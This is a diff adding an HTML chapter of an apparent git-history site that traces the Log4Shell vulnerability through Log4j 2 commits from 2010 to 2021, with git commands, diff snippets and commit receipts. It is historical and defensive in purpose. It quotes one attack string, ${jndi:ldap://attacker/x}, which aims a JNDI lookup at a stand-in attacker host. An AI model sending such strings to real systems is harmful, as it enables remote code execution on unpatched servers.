@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en" data-theme-default="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>To improve performance — Blame</title>
+<meta name="description" content="The complete dig: five commits over eleven years, each command and receipt, that add up to Log4Shell.">
+<link rel="stylesheet" href="../static/style.css">
+<script src="../static/theme.js"></script>
+</head>
+<body>
+<header class="site-header"><div class="row">
+  <a class="brand" href="../index.html"><b>git blame</b> · Blame</a>
+  <nav class="site-nav"><a href="../index.html">contents</a><a href="../about.html">method</a><button class="theme-toggle" type="button">☾ dark</button></nav>
+</div></header>
+<main class="wrap">
+<p class="kicker">chapter <b>02</b> · full dig · repo <b>apache/logging-log4j2</b> · CVE-2021-44228</p>
+<h1>To improve performance</h1>
+<p><em>This is the full dig — every command, every receipt. The plain-English telling of the same story is here: <a href="02-log4j2.html">To improve performance</a>.</em></p>
+<p><code>git clone https://github.com/apache/logging-log4j2</code>, and you can walk Log4Shell backward — not to the December 2021 week everyone remembers, but to five commits spread across eleven years, in order, each one the sort of change you would have approved without a second thought. None of them is the bug. The bug is what they add up to. Here they are, oldest first.</p>
+<h2>2010: a small language</h2>
+<p>The first deposit is a convenience. In October 2010, Ralph Goers — who built most of Log4j 2 — adds variable substitution: the ability to write <code>${sys:user.name}</code> in a config file and have it resolve at runtime. <a class="receipt-ref" href="#r1">R1</a> It is a feature every logging framework has. It is also, quietly, a little programming language: a string containing <code>${</code> is no longer just text, it is an <em>instruction</em>, and the thing that reads the instruction walks a list of registered "lookups" — <code>sys</code>, <code>env</code>, <code>date</code> — and dispatches on the prefix before the colon.</p>
+<p>The design decision that matters is not the language. It is that the list of verbs is <em>open</em>. Any plugin annotated as a lookup joins the vocabulary automatically. Whatever anyone registers later becomes a word this little language can speak, in every config file, forever. In 2010 the words are boring and the input is trusted — the config file is written by the operator, not the user. That is the whole safety argument, and it is about to spring a slow leak.</p>
+<h2>2012: to improve performance</h2>
+<p>September 2012, Ralph again. The subject line is the least alarming in the chain:</p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git show --format='%s' 8916625d91
+Move variable substitution from PatternLayout to appropriate converters to improve performance.</code></pre>
+<p>A performance refactor. Before this commit, substitution ran over the <em>layout pattern</em> — the template string the operator writes in <code>log4j2.xml</code>. After it, substitution runs over the formatted message. The two lines that do it:</p>
+<pre><span class="lang">diff</span><code><span class="diff-add">+            toAppendTo.append(config != null &amp;&amp; result.contains("${") ?</span>
+<span class="diff-add">+                config.getSubst().replace(event, result) : result);</span></code></pre>
+<p>Read what that ternary does. If the formatted log message contains <code>${</code>, run the interpolator on it; otherwise, skip. The <code>contains("${")</code> is a performance guard — don't pay for substitution on messages that don't need it. <a class="receipt-ref" href="#r2">R2</a> It is a good instinct, the kind a reviewer approves on sight: the old code ran the substitution engine over every layout unconditionally, and here is a two-character test that skips the expensive path for the overwhelming majority of log lines that contain no <code>${</code> at all. In a hot path — and logging is the hottest path most servers have — that check is exactly the optimization you want. The commit is measured in microseconds saved per event. But the message is the string the <em>application</em> built. It is the username someone typed, the User-Agent a browser sent, the search query, the header. As of this commit, if any of that text contains <code>${</code>, it gets handed to the little language from 2010.</p>
+<p>Nobody is logging attacker input into it yet, because nobody has registered a dangerous verb. Ralph is optimizing a layout. He has also just wired the open vocabulary of 2010 directly to the outside world, and the <code>contains("${")</code> line he wrote to <em>save</em> CPU is the exact line that will, nine years on, trigger the exploit.</p>
+<p class="beat">A performance guard and an attack trigger can be the same two lines of code.</p>
+<h2>2013: the colon</h2>
+<p>Ten months later, a verb worth having arrives. July 2013, LOG4J2-313:</p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git show --format='%s' f1a0cac60f
+LOG4J2-313 - Add JNDILookup</code></pre>
+<p>JNDI is a perfectly reasonable enterprise feature: ask the Java container for a configured resource by name — a database handle, a setting — via <code>java:comp/env/</code>. The commit registers it next to <code>sys</code> and <code>env</code>:</p>
+<pre><span class="lang">diff</span><code><span class="diff-add">+        lookups.put("jndi", new JndiLookup());</span>
+<span class="diff-add">+            java:comp/env/, however if the key contains a ":" no prefix will be added.</span></code></pre>
+<p>The first line adds the verb. The second is from the <em>documentation</em>, checked in with the same commit. To be helpful, <code>JndiLookup</code> prepends the safe <code>java:comp/env/</code> prefix — <em>unless the key already contains a colon</em>, so that an explicit scheme like <code>java:</code> still works. <a class="receipt-ref" href="#r3">R3</a> But <code>ldap:</code> contains a colon. So does <code>rmi:</code>, and <code>dns:</code>. The convenience that lets you write an explicit scheme is the convenience that lets an attacker write <em>any</em> scheme, pointed at <em>any</em> server.</p>
+<p>Now the pieces are all present, and no single person put them together. <code>${</code> in a message reaches the interpolator (2012). The interpolator dispatches to <code>jndi</code> (2013). <code>jndi</code> with a colon fetches a remote URL (2013). A log line reading <code>${jndi:ldap://attacker/x}</code> is now a remote code path. It has been, since this Thursday afternoon, and it will stay that way for eight years while everyone looks straight at it.</p>
+<h2>2016: the off switch nobody flips</h2>
+<p>The most painful part of the record is that Log4j <em>saw</em> it. Not as a security hole — as a bug report about the wrong thing.</p>
+<p>In 2016, users of Apache Camel file a compatibility bug: <code>${...}</code> sequences in their log messages are being eaten. Someone logs a string that happens to contain <code>${</code>, and Log4j quietly tries to resolve it instead of printing it. From the maintainers' side this is a well-formed ticket about an interaction between two libraries — annoying, reproducible, fixable. It is also the vulnerability, reported by its own users, four years early, described in the vocabulary of interoperability. The fix is careful and correct for the problem as filed: <code>%m{nolookups}</code>, an opt-in that tells Log4j <em>not</em> to treat a message as a program. <a class="receipt-ref" href="#r4">R4</a> The default stays as it was: treat it as a program. Nobody in the thread is wrong. The word that would have changed everything — that "firing on user data" is not a Camel quirk but a class of remote exploit — is not a word anyone in a compatibility ticket has a reason to reach for.</p>
+<p>The next year they go further. Carter Kozak adds a JVM-wide kill switch so you don't have to remember the per-pattern option:</p>
+<pre><span class="lang">diff</span><code><span class="diff-add">+    public static final boolean FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(</span>
+<span class="diff-add">+            "log4j.formatMsgNoLookups", false);</span></code></pre>
+<p><code>false</code>. <a class="receipt-ref" href="#r5">R5</a> The kill switch ships in every Log4j from 2.10 onward, disabled by default. The exact mitigation the entire internet scrambled to apply in December 2021 — <code>log4j.formatMsgNoLookups=true</code> — had been sitting in the jar, one boolean away, since 2017. Nobody flips it, because from the inside there is nothing to flip it <em>for</em>. The commit messages are about Camel and CPU cycles. An off switch whose default is on is not a mitigation. It is a comment.</p>
+<h2>2021: this feature is not used</h2>
+<p>The last deposit before the fire is dated eleven days before the world learns the word Log4Shell, and its timestamps are the story:</p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git log -1 --format='AuthorDate: %aI%nCommitDate: %cI' 001aaada7d
+AuthorDate: 2021-11-29T14:20:33+00:00
+CommitDate: 2021-12-04T22:47:24-07:00</code></pre>
+<p>November 29. Alibaba's security team had privately reported the RCE to Apache around November 24. Five days later, Carter Kozak authors a commit that finally flips the default — and its message never says why:</p>
+<blockquote>Lookups in messages are confusing, and muddy the line between logging APIs and implementation.</blockquote>
+<blockquote>… There's also a cost to searching formatted message strings for particular escape sequences</blockquote>
+<blockquote>which define lookups. This feature is not used as far as we've been able to tell searching</blockquote>
+<blockquote>github and stackoverflow, so it's unnecessary for every log event in every application to burn</blockquote>
+<blockquote>several cpu cycles searching for the value.</blockquote>
+<p>"This feature is not used." <a class="receipt-ref" href="#r6">R6</a> They grepped GitHub and Stack Overflow and found almost nobody who <em>wanted</em> message lookups. They were right. They were about to discover that everybody <em>had</em> them. Whether Carter is quietly acting on the private report or independently killing a misfeature the same week, the commit does the correct thing for a reason adjacent to the truth: it is a cleanup, it is unused, it costs cycles. The word "security" does not appear. The default flips eleven days before the CVE, in a commit about CPU.</p>
+<h2>The fire</h2>
+<p>On December 9 the disclosure is public and the internet is on fire. The commits from that week are the only part of this story anyone remembers. Here is the one that isn't in the postmortems.</p>
+<p>Saturday, December 4, 21:00 Colorado time, Ralph checks in the first defensive patch — limit which JNDI protocols work. In the same commit is a new test class:</p>
+<pre><span class="lang">diff</span><code><span class="diff-add">+public class JndiExploit implements ObjectFactory {</span>
+<span class="diff-add">+        fail("getObjectInstance must not be allowed");</span></code></pre>
+<p>They named it <code>JndiExploit</code>. <a class="receipt-ref" href="#r7">R7</a> The test asserts that a remote object factory must never run — the exact mechanism of the attack — on the same Saturday night they believe they have contained it. They have not. That first patch only limits protocols; other paths still reach JNDI, and 2.15 ships with the hole narrowed, not closed.</p>
+<p>Then, on December 13, the deeper fix, and it explains itself by pointing back to 2010:</p>
+<pre><span class="lang">diff</span><code>$ git show 70edc23334 -- '*Interpolator.java'</code></pre>
+<p>2.16 does not just remove <code>JndiLookup</code> — it excludes the class by its hard-coded fully-qualified name. <a class="receipt-ref" href="#r8">R8</a> It has to, because of the open vocabulary from the very first deposit: <code>JndiLookup</code> carries a <code>@Plugin</code> annotation, and the plugin loader would cheerfully register it again. You cannot delete a verb from a language that auto-discovers its verbs; you have to name the specific thing and forbid it. The tension was flagged in the code the whole time — a <code>// TODO: this ought to use the PluginManager</code> comment, added in 2014, still sitting there when the fire started, only resolved in January 2022. <a class="receipt-ref" href="#r9">R9</a></p>
+<h2>At home</h2>
+<p>A system acquires a vulnerability the way it acquires a feature: incrementally, by people who each saw only their piece. So when you inherit a codebase, do not just grep for the scary function. Grep for the <em>seam</em> — the commit that connected two safe things into one unsafe thing. <code>git log -S 'contains("${")'</code> finds the 2012 pivot in one shot; it is the moment data started being treated as code, and its message says "performance." The dangerous commit almost never says danger. It says convenience, or speed, or cleanup. Read the ones that move where a string gets evaluated, not just the ones that add a new way to evaluate it. And if your config language auto-discovers its own verbs, write down — today, before the fire — the list of things it must never be allowed to say.</p>
+<div class="receipts"><h2>receipts</h2><ul><li id="r1"><span class="rid">R1</span> <code>git show 2338fcb9fb</code> — 2010-10-25, variable substitution + the plugin-driven Interpolator.</li><li id="r2"><span class="rid">R2</span> <code>git show 8916625d91 -- '*MessagePatternConverter.java'</code> — 2012-09-23, "to improve performance"; the <code>contains("${")</code> ternary that runs the interpolator over the formatted message.</li><li id="r3"><span class="rid">R3</span> <code>git show f1a0cac60f</code> — 2013-07-18, <code>lookups.put("jndi", ...)</code> and the doc line: "if the key contains a <code>:</code> no prefix will be added."</li><li id="r4"><span class="rid">R4</span> <code>git show 6a4c88d4ae</code> — 2016-08-19, the <code>%m{nolookups}</code> opt-in (default: lookups on).</li><li id="r5"><span class="rid">R5</span> <code>git show dd18e9b210 -- '*Constants.java'</code> — 2017, <code>log4j.formatMsgNoLookups</code>, default <code>false</code>.</li><li id="r6"><span class="rid">R6</span> <code>git log -1 --format='%aI %cI %B' 001aaada7d</code> — authored 2021-11-29 (post private report), the default flip whose message says "this feature is not used," never "security."</li><li id="r7"><span class="rid">R7</span> <code>git show d82b47c6fa --stat</code> and <code>-- '*JndiExploit.java'</code> — 2021-12-04, first limiting patch ships with a test class named <code>JndiExploit</code>.</li><li id="r8"><span class="rid">R8</span> <code>git show 70edc23334 -- '*Interpolator.java'</code> — 2021-12-13, 2.16 excludes <code>JndiLookup</code> by hard-coded FQCN because the plugin loader would re-register it.</li><li id="r9"><span class="rid">R9</span> <code>git log -S 'this ought to use the PluginManager'</code> — the 2014 TODO, unresolved until 2022-01-21.</li></ul><p class="regen">Every command above is reproducible against a fresh clone. Full transcripts and the regenerate script sit beside this chapter in the repository.</p></div>
+<div class="chapter-foot"><a href="../index.html">← contents</a><a href="../about.html">how to check this →</a></div>
+</main>
+<footer class="site-footer"><div class="wrap">Blame — git archaeology. Every hash is real; clone the repo and run the command.</div></footer>
+</body>
+</html>
